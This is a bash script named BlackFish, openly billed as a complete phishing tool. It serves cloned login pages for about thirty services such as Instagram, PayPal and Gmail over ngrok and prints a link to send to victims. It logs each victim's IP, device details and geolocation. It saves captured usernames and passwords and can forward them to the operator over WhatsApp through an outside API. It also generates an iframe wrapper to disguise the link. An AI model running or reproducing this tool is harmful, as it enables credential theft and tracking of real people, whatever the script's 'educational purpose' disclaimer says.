#!/usr/bin/env bash

#-Metadata----------------------------------------------------#
#  Filename: BlackFish(v1.2)       (Update: 2020-02-03)       #
#-Info--------------------------------------------------------#
#  BlackFish - A Complete Phishing Tool                       #
#-Author(s)---------------------------------------------------#
#  Waseem Akram ~ @hackerwasii                                #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Linux & Termux	                  #
#  Reported working : Ubuntu 16                               #
#           : Termux                                          #
#	   	    : Parrot 				                          #
#	   	    : BlackArch				                          #
#           : Kali Linux 			                          # 
#		    : Backbox     			                          #
#-Licence-----------------------------------------------------#
#  GNU General Public License v3.0                            #
#-------------------------------------------------------------#
TOOLNAME='BlackFish'
VERSION='1.2'
NAME='Waseem Akram (evildevill)'
CODENAME='BlackFish'

#COLOUR
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'

# First check of setup for internet connection by connecting to google over http
echo -e "$green" "[ * ] Checking for internet connection"
sleep 1
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo -e "$red" [ X ]::[Internet Connection]: OFFLINE!;
#   chknet
    sleep 1
    exit
else
echo -e "$green" [ ✔ ]::[Internet Connection]: CONNECTED!;
    sleep 2
    clear
    echo ""
    #cont
fi

#VARIABLE
path=$(pwd)

if [[ -f "${path}/release" ]]; then
	Versi=$(sed -n 1p < "$path/release")
   else
	echo ""
	echo -e "$red""* - Version Control File Not Found"
	echo ""
	echo -ne "$okegreen""* - Updating BlackFish Main Files ....."
	
# Cleaning Old Version
	rm -f "${path}/blackfish" >/dev/null 2>&1
	
# Getting New Files on Repositoy BlackFish
	wget https://raw.githubusercontent.com/evildevill/BlackFish/master/blackfish.sh -O "${path}/blackfish.sh" >/dev/null 2>&1

# Give Permssion To New Files
	chmod +x "${path}/blackfish.sh" >/dev/null 2>&1
	echo "Done"
	sleep 3
	echo ""
	echo -e "$orange""Restart BlackFish"
    exit 1
fi

#ping -c 1 google.com > /dev/null 2>&1
#png="$?" 
# if [ $png == "0" ]
#then
#ping google hostname was succefully , then proceed with setup 
#    echo -e $green [ ✔ ]::[Internet Connection]: CONNECTED!;
#    sleep 1
#    cont
#elif [ $png == "1" ]
#then
#ping hostname failed , load chknet function
#    echo -e $yellow [ X ]::[Internet Connection]: LOCAL ONLY!;
#    chknet
#    sleep 1
#elif [ $png == "2" ]
#then
#ping hostname failed , load chknet function
#echo -e $red [ X ]::[Internet Connection]: OFFLINE!;
#chknet
#    sleep 1
#fi

banner() {
    clear
    echo
    figlet BlackFish
    echo -e $red"<===================================================>"
    echo -e "$white||  "$white" |=| "$okegreen"$TOOLNAME $white                           ||"
    echo -e "||  $white |=| "$okegreen"Version : $VERSION \t\t   $white           ||"
    echo -e "||  $white |=| "$okegreen"Code by : $NAME $white || "
    echo -e "||  $white |=| "$okegreen"Codename: $CODENAME $white \t\t      || "
    echo -e $white"||"$red"============================================$white||"
    echo -e $red"<===================================================>"
    echo ""
}
menu() {
echo -e "\e[92m[\e[34m1\e[92m]\e[92m---\e[92mSTART\e[0m        \e[92m[\e[34m2\e[92m]\e[92m---\e[92mUPDATE\e[0m"
echo -e "\e[92m[\e[34m3\e[92m]\e[92m---\e[92mABOUT\e[0m        \e[92m[\e[34m4\e[92m]\e[92m---\e[92mMORE\e[0m"
echo -e "\e[92m[\e[34m5\e[92m]\e[92m---\e[92mFOLLOW\e[0m       \e[92m[\e[34m6\e[92m]\e[92m---\e[92mVIDEO\e[0m"
echo -e "\e[92m[\e[34m7\e[92m]\e[92m---\e[92mCHAT NOW\e[0m     \e[92m[\e[34m8\e[92m]\e[92m---\e[92mRESTART\e[0m"
echo -e "\e[92m[\e[34m9\e[92m]\e[92m---\e[92mEXIT\e[0m "
echo 
echo -ne "\e[92mChose Option\e[0m : \e[92m" 
read input
if [[ "$input" = "1" || "$input" = "01" ]];
then 
pagemenu
elif [[ "$input" = "2" || "$input" = "02" ]];
then
echo 
echo -e  "            I'll Updated as soon as possible"
elif [[ "$input" = "3" || "$input" = "03" ]];
then
about
elif [[ "$input" = "4" || "$input" = "04" ]];
then
moremenu
elif [[ "$input" = "5" || "$input" = "05" ]];
then
am start -a android.intent.action.VIEW -d https://bit.ly/hackerwasii 2>/dev/null
elif [[ "$input" = "6" || "$input" = "06" ]];
then
am start -a android.intent.action.VIEW -d https://hackerwasii.blogspot.com > /dev/null 2>&1
elif [[ "$input" = "7" || "$input" = "07" ]];
then
am start -a android.intent.action.VIEW -d https://wa.me/923137119351 > /dev/null 2>&1
elif [[ "$input" = "8" || "$input" = "08" ]];
then
bash blackfish.sh
elif [[ "$input" = "9" || "$input" = "09" ]];
then
exit 1
else
echo
echo -e "\e[93m      Please Enter Right option.....\e[0m"
exit 1
fi
}

about () {
clear
echo -e '\e[96m                       ----------------'
echo -e '\e[92m                       ┌─┐┌┐ ┌─┐┬ ┬┌┬┐
                       ├─┤├┴┐│ ││ │ │ 
                       ┴ ┴└─┘└─┘└─┘ ┴ '
echo -e '\e[96m                       ----------------'
echo -e '\e[96m      |------------------|'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 1.5
echo -e '\e[96m     [\e[92m+\e[96m]-------[\e[92mWaseem Akram\e[96m]'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 1.0
echo -e '\e[96m     [\e[92m+\e[96m]-------[\e[92mAbout\e[96m]'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
echo -e '\e[96m      |'
sleep 2.0
echo -e '\e[96m     [\e[92m+\e[96m]--------------'
echo -e '\e[96m                      |'
echo -e '\e[92m  THIS TOOLS IS ONLY FOR EDUCATIONAL PURPOSE SO'
echo -e '\e[92m IM NOT RESPONSIBLE IF YOU DO ANY ILLEGAL THINGS'
echo -e '\e[92m   THANKS FOR READING SUBSCRIBE {Waseem Akram}'
echo -e '\e[92m           HAVE A GOOD DAY BUDDIE :)'
echo -e '\e[96m                      |'
echo -e '\e[96m                      |'
sleep 4.5
echo -e '\e[96m                     [\e[92m+\e[96m]------------[\e[92mBYE\e[96m]\e[0m'
sleep 2.0
cd ${path}
clear
bash blackfish.sh
}

catch_cred() {
echo ""
account=$(cat $HOME/blackfish/webs/$site/gmail.txt)
echo "$account" >> dump.creds.txt 2>&1
IFS=$'\n'
password=$(cat $HOME/blackfish/webs/$site/pass.txt)
echo "$password" >> dump.creds.txt 2>&1
echo -e "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[0m\e[1;92m Account: \e[0m$account\e[0m"
echo -e "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[0m\e[1;92m Password: \e[0m$password\e[0m"
if [[ -f key.txt ]] && [[ -f num.txt ]]
then
tim=$(date +%D-%T)
datnum=$(cat num.txt)
datkey=$(cat key.txt)
whats=$(curl -s -l "http://api.callmebot.com/whatsapp.php?phone=$datnum&text=Account:$account%20||%20Pass:$password%20||%20Site:$site%20||%20Time:$tim%20&apikey=$datkey" 2>&1)
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Whatsapp Forward:\e[0m\e[1;0m Successfull"
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Saved:\e[0m\e[1;0m $site/dump.all.txt"
rm webs/$site/pass.txt 2>&1
rm webs/$site/gmail.txt 2>&1
rm webs/$site/ip.txt 2>&1
checkfound
pkill -f -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
exit 1
else
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Whatsapp Forward:\e[0m\e[1;91m Off"
echo -e  "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m]\e[92m Saved:\e[0m\e[1;0m $site/dump.all.txt"
rm webs/$site/pass.txt 2>&1
rm webs/$site/gmail.txt 2>&1
rm webs/$site/ip.txt 2>&1
checkfound
pkill -f -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
exit 1
fi
}

pagemenu (){
banner
echo
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mInstagram\e[0m  \e[92m[\e[34m11\e[92m]\e[92m---\e[93mAirtelSim\e[0m   \e[92m[\e[34m21\e[92m]\e[92m---\e[93mWordpress\e[0m"
echo -e "  \e[92m[\e[34m2\e[92m]\e[92m---\e[93mFacebook\e[0m   \e[92m[\e[34m12\e[92m]\e[92m---\e[93mAmazon\e[0m      \e[92m[\e[34m22\e[92m]\e[92m---\e[93mJioRouter\e[0m"
echo -e "  \e[92m[\e[34m3\e[92m]\e[92m---\e[93mSociallub\e[0m  \e[92m[\e[34m13\e[92m]\e[92m---\e[93mApple\e[0m       \e[92m[\e[34m23\e[92m]\e[92m---\e[93mSnapchat\e[0m"
echo -e "  \e[92m[\e[34m4\e[92m]\e[92m---\e[93mNetflix\e[0m    \e[92m[\e[34m14\e[92m]\e[92m---\e[93mClasofclans\e[0m \e[92m[\e[34m24\e[92m]\e[92m---\e[93mOla\e[0m"
echo -e "  \e[92m[\e[34m5\e[92m]\e[92m---\e[93mTelegram\e[0m   \e[92m[\e[34m15\e[92m]\e[92m---\e[93mGoogle\e[0m      \e[92m[\e[34m25\e[92m]\e[92m---\e[93mPayPal\e[0m"
echo -e "  \e[92m[\e[34m6\e[92m]\e[92m---\e[93mYahoo\e[0m      \e[92m[\e[34m16\e[92m]\e[92m---\e[93mFreeFire\e[0m    \e[92m[\e[34m26\e[92m]\e[92m---\e[93mLinkedin\e[0m"
echo -e "  \e[92m[\e[34m7\e[92m]\e[92m---\e[93mYoutube\e[0m    \e[92m[\e[34m17\e[92m]\e[92m---\e[93mGithub\e[0m      \e[92m[\e[34m27\e[92m]\e[92m---\e[93mPlaystation\e[0m"
echo -e "  \e[92m[\e[34m8\e[92m]\e[92m---\e[93mXbox\e[0m       \e[92m[\e[34m18\e[92m]\e[92m---\e[93mGmail\e[0m       \e[92m[\e[34m28\e[92m]\e[92m---\e[93mPubg\e[0m"
echo -e "  \e[92m[\e[34m9\e[92m]\e[92m---\e[93mWifi\e[0m       \e[92m[\e[34m19\e[92m]\e[92m---\e[93mOutlook\e[0m     \e[92m[\e[34m29\e[92m]\e[92m---\e[93mShopify\e[0m"
echo -e "  \e[92m[\e[34m10\e[92m]\e[92m---\e[93mTwitter\e[0m   \e[92m[\e[34m20\e[92m]\e[92m---\e[93mSteam\e[0m       \e[92m[\e[34m30\e[92m]\e[92m---\e[93mSocialClub\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optio
if [[ "$optio" == "1" || "$optio" == "one" || "$optio" == "instagram" ]];
then
insmenu
elif [[ "$optio" == "2" || "$optio" == "two" || "$optio" == "facebook" ]]
then
fbmenu
elif [[ "$optio" == "3" || "$optio" == "three" || "$optio" == "socialclub" ]]
then
site="socialclub"
start
elif [[ "$optio" == "4" || "$optio" == "four" || "$optio" == "netflix" ]]
then
site="netflix"
start
elif [[ "$optio" == "5" || "$optio" == "five" || "$optio" == "telegram" ]] 
then
site="telegram"
start
elif [[ "$optio" == "6" || "$optio" == "six" || "$optio" == "yahoo" ]]
then
site="yahoo"
start
elif [[ "$optio" == "7" || "$optio" == "seven" || "$optio" == "youtube" ]]
then
site="youtube"
start
elif [[ "$optio" == "8" || "$optio" == "eight" || "$optio" == "xbox" ]]
then
site="xbox"
start
elif [[ "$optio" == "9" || "$optio" == "nine" || "$optio" == "wifi" ]]
then
site="wifi"
start
elif [[ "$optio" == "10" || "$optio" == "ten" || "$optio" == "twitter" ]]
then
site="twitter"
start
elif [[ "$optio" == "11" || "$optio" == "eleven" || "$optio" == "airtelsim" ]]
then
site="airtelsim"
start
elif [[ "$optio" == "12" || "$optio" == "twelve" || "$optio" == "amazon" ]]
then                                                                         
site="amazon"
start
elif [[ "$optio" == "13" || "$optio" == "thirteen" || "$optio" == "apple" ]]
then                                                                             
site="apple"
start
elif [[ "$optio" == "14" || "$optio" == "fourteen" || "$optio" == "clashofclans" ]]
then                                                                             
site="clashofclans"
start
elif [[ "$optio" == "15" || "$optio" == "fifteen" || "$optio" == "google" ]]
then                                                                             
gmenu
start
elif [[ "$optio" == "16" || "$optio" == "sixteen" || "$optio" == "freefire" ]]
then                                                                             
site="freefire"
start
elif [[ "$optio" == "17" || "$optio" == "seventeen" || "$optio" == "github" ]]
then
site="github"                                                                                                               
start
elif [[ "$optio" == "18" || "$optio" == "eighteen" || "$optio" == "gmail" ]]
then
site="gmail"                                                                                                               
start
elif [[ "$optio" == "19" || "$optio" == "ninteen" || "$optio" == "outlook" ]]
then
site="outlook"                                                                                                              
start
elif [[ "$optio" == "20" || "$optio" == "twenty" || "$optio" == "steam" ]]
then
site="steam"                                                                                                               
start
elif [[ "$optio" == "21" || "$optio" == "twentyone" || "$optio" == "wordpress" ]]
then
site="wordpress"                                                                                                               
start
elif [[ "$optio" == "22" || "$optio" == "twentytwo" || "$optio" == "jiorouter" ]]
then
site="jiorouter"                                                                                                               
start
elif [[ "$optio" == "23" || "$optio" == "twentythree" || "$optio" == "snapchat" ]]
then
site="snapchat"                                                                                                               
start
elif [[ "$optio" == "24" || "$optio" == "twentyfour" || "$optio" == "ola" ]]
then
site="ola"                                                                                                               
start
elif [[ "$optio" == "25" || "$optio" == "twentyfive" || "$optio" == "paypal" ]]
then
site="paypal"                                                                                                               
start
elif [[ "$optio" == "26" || "$optio" == "twentysix" || "$optio" == "linkedin" ]]
then
site="linkedin"                                                                                                               
start
elif [[ "$optio" == "27" || "$optio" == "twentyseven" || "$optio" == "playstation" ]]
then
site="playstation"                                                                                                               
start
elif [[ "$optio" == "28" || "$optio" == "twentyeight" || "$optio" == "pubg" ]]
then
site="pubg"                                                                                                               
start
elif [[ "$optio" == "29" || "$optio" == "twentynine" || "$optio" == "shopify" ]]
then
site="shopify"                                                                                                               
start
elif [[ "$optio" == "30" || "$optio" == "thirtee" || "$optio" == "socialclub" ]]
then
site="socialclub"                                                                                                               
start
elif [[ "$optio" == "00" || "$optio" == "back" || "$optio" == "0" ]]
then
banner
menu
fi
}
insmenu() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mInstagram\e[0m   \e[92m[\e[34m2\e[92m]\e[92m---\e[93mIGverify\e[0m   \e[92m[\e[34m3\e[92m]\e[92m---\e[93mIGfollowers\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optioz
if [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "instagram" ]];
then
site="instagram"
start
elif [[ "$optioz" == "2" || "$optioz" == "two" || "$optioz" == "instagram" ]];
then
site="igverify"
start
elif [[ "$optioz" == "3" || "$optioz" == "three" || "$optioz" == "instagram" ]];
then                                                                                                      
site="instafollowers"
start
fi
}

fbmenu() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mFacebook\e[0m   \e[92m[\e[34m2\e[92m]\e[92m---\e[93mFBpoll\e[0m   \e[92m[\e[34m3\e[92m]\e[92m---\e[93mFBsecurity\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optioz
if [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "facebook" ]];
then
site="facebook"
start
elif [[ "$optioz" == "2" || "$optioz" == "two" || "$optioz" == "facebook" ]];
then
site="fbpoll"
start
elif [[ "$optioz" == "3" || "$optioz" == "three" || "$optioz" == "facebook" ]];
then
site="fbsec"
start
fi
}

gmenu() {
echo
echo -e "  \e[92m[\e[34m1\e[92m]\e[92m---\e[93mGoogle\e[0m   \e[92m[\e[34m2\e[92m]\e[92m---\e[93mGooglepoll\e[0m"
echo
echo -ne "\e[92mSELECT OPTION\e[0m: \e[92m"
read optioz
if [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "Google" ]];
then
site="googlenew"
start
elif [[ "$optioz" == "1" || "$optioz" == "one" || "$optioz" == "Google" ]];
then
site="googlepoll"
start
fi
}


getcredentials() {
echo ' '
printf "\e[1;93m[\e[0m\e[1;34m•\e[0m\e[1;93m] Waiting for data ...\e[0m\n"
while [ true ]; do
if [[ -e "webs/$site/gmail.txt" ]]; then
printf "\n\e[1;93m[\e[34m•\e[1;93m]\e[0m\e[1;92m Fetched Data Found!\n"
catch_cred
fi
sleep 1
done
}


checkfound() {
echo ' '
echo -e "\e[1;93m[\e[0m\e[34m•\e[0m\e[1;93m] Waiting for victim to open link...\e[0m\n"
echo ' '
#echo -e "\e[92m------------------------\e[91mVICTIM FOUND\e[92m-------------------------\e[0m"
while [ true ]; do
if [[ -e "$HOME/blackfish/webs/$site/ip.txt" ]]; then
echo
echo -e "\e[92m------------------------\e[34mVICTIM FOUND\e[92m-------------------------\e[0m"
echo
echo -e  "\n\e[1;92m[\e[34m•\e[1;92m] Device info found..."
echo ' '
#echo -e "\e[92m------------------------\e[91mVICTIM FOUND\e[92m-------------------------\e[0m"
echo ' '
catch_ip
fi
sleep 1
done
}

catch_ip() {
ip=$( egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'  webs/$site/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' webs/$site/ip.txt | cut -d '"' -f2)
echo -e "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m$ua\e[0m\e[1;77m\e[0m\n"
chk=$(fmt -20 webs/$site/ip.txt)
sch=$(echo "$chk" > cod.txt)                                                                                                         
dom1=$(sed -n '5p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom2=$(sed -n '6p' cod.txt | cut -d"(" -f2 | cut -d";" -f1)
dom3=$(sed -n '7p' cod.txt | cut -d";" -f2 | cut -d")" -f1)
dom4=$(sed -n '11p' cod.txt | cut -d "/" -f1)
dom5=$(sed -n '11p' cod.txt | cut -d " " -f2 | cut -d"/" -f2)
dom6=$(sed -n '12p' cod.txt | cut -d"(" -f2 | cut -d")" -f1)
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Kernel:\e[1;0m$dom1\e[0m" 
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Os:\e[1;0m$dom2\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Model:\e[1;0m$dom3\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Browser:\e[0m$dom4\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Version:\e[1;0m$dom5\e[0m"
echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m$dom6\e[0m"
cat webs/$site/ip.txt >> webs/$site/dump.ip.txt

if [[ -e location.txt ]]; then
rm -rf location.txt
fi

IFS='\n'
iptracker=$(curl -s -L "http://ipwhois.app/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
IFS=$'\n'
iptt=$(sed -n 's/"ip"://p' track.txt)

if [[ $iptt != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Device ip: \e[0m$iptt\e[0m"
fi

iptype=$(sed -n 's/"type"://p' track.txt)
if [[ $iptype != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] IP type: \e[0m$iptype\e[0m" 
fi

continent=$(sed -n 's/"continent"://p' track.txt)
if [[ $continent != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Continent: \e[0m$continent\e[0m" 
fi

country=$(sed -n 's/"country"://p' track.txt)
if [[ $country != "" ]]; then
echo -e  "\e[1;92m[\e[34m•\e[92m] Country: \e[0m$country\e[0m"
fi

flag=$(sed -n 's/"country_flag"://p' track.txt)
if [[ $flag != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country flag: \e[0m$flag\e[0m"
fi

cap=$(sed -n 's/"country_capital"://p' track.txt)
if [[ $cap != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country capital: \e[0m$cap\e[0m"
fi

phon=$(sed -n 's/"country_phone"://p' track.txt)
if [[ $phon != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Country code: \e[0m$phon\e[0m"
fi

region=$(sed -n 's/"region"://p' track.txt)
if [[ $region != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] State: \e[0m$region\e[0m"
fi

city=$(sed -n 's/"city"://p' track.txt)
if [[ $city != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] City: \e[0m$city\e[0m"
fi

isp=$(sed -n 's/"isp"://p' track.txt)
if [[ $isp != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Isp: \e[0m$isp\e[0m" 
fi

ccode=$(sed -n 's/"currency_code"://p' track.txt)
if [[ $ccode != "" ]]; then
echo -e "\e[1;92m[\e[34m•\e[92m] Currency code: \e[0m$ccode\e[0m"
fi

printf "\n" 
getcredentials

}
start() {
if [[ -e webs/$site/pass.txt ]]; then
rm -rf webs/$site/pass.txt 2>&1
fi

if [[ -e webs/$site/gmail.txt ]]; then
rm -rf webs/$site/gmail.txt 2>&1
fi

if [[ -e ngrok ]]; then
echo ""
else
echo
printf "\e[1;92m[\e[34m•\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm')
if [[ $arch == *'arm'* ]]; then
wget https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-2.2.8-linux-arm.zip ]]; then
unzip ngrok-2.2.8-linux-arm.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-2.2.8-linux-arm.zip
else                                                                                                                  
echo
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"                              
exit 1
fi
else
wget https://github.com/noob-hackers/impstuff/raw/main/ngrok%2Bwifi%2Bdata.zip > /dev/null 2>&1
if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
rm -rf $HOME/.ngrok2 > /dev/null 2>&1                                                                    
chmod +x ngrok                                                                                                       
rm -rf ngrok+wifi+data.zip
else
echo
printf "\e[1;93m[!] Unable to download \e[0m\n"
exit 1
fi                                                                                                                    
fi
fi                                                                                                                    


echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
cd webs/$site && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 8
echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 15
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
stat=$(echo "$status")
if [ "$stat" = "200" ];
then
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[0m200\e[34m]\e[0m"
touch bypass.html
cat > bypass.html << EOF
<iframe name="$site" src="$link" width="100%" height="100%" frameborder="0" scrolling="yes" style="width: 100%;"> </iframe>
EOF
bypass=$(cat bypass.html)
echo
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"                                                     
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[92m"
echo
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
checkfound
else
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[91m000\e[34m]\e[0m"
echo
echo -e  "\e[92m[-------------\e[34mGoogle Bypass Code\e[92m-------------]\e[91m"
echo -e  "\e[0m$bypass \e[0m"
echo -e  "\e[92m[-----------\e[34mUse This Code in Github\e[92m----------]\e[91m"
echo
echo -e  "\e[1;92m[\e[34m•\e[1;92m] Send This Link: \e[0m$link\e[0m"
checkfound
fi
}
moremenu () {
banner
echo
echo -e "\e[92m[1]---------- Whats App Forward Setup\e[0m"
echo -e "\e[92m[2]---------- Google Bypass Hack\e[0m"
echo
echo -ne "\e[92m Select Option: \e[92m"
read opto
if [ "$opto" = "1" ]
then
echo
echo -e "        If You Dont Now This Then Ask Developer"
echo
echo -e "\e[93m   example: +92313xxxxxxx\e[92m"
echo -ne "\e[92m   Number With Country Code: \e[92m"
read numz
nun=$(echo "$numz" > num.txt)
echo -e "\e[93m   example: 728992\e[92m"
echo -ne "\e[92m   Add code by Bot: \e[92m"
read keyz
nunz=$(echo "$keyz" > key.txt)
echo
echo -e "\e[92m Success...Now Use Tool and Check Whats App.."
echo
elif [ "$opto" = "2" ]
then
am start -a android.intent.action.VIEW -d https://wa.me/923137119351 > /dev/null 2>&1
fi
bash blackfish.sh
}
banner
menu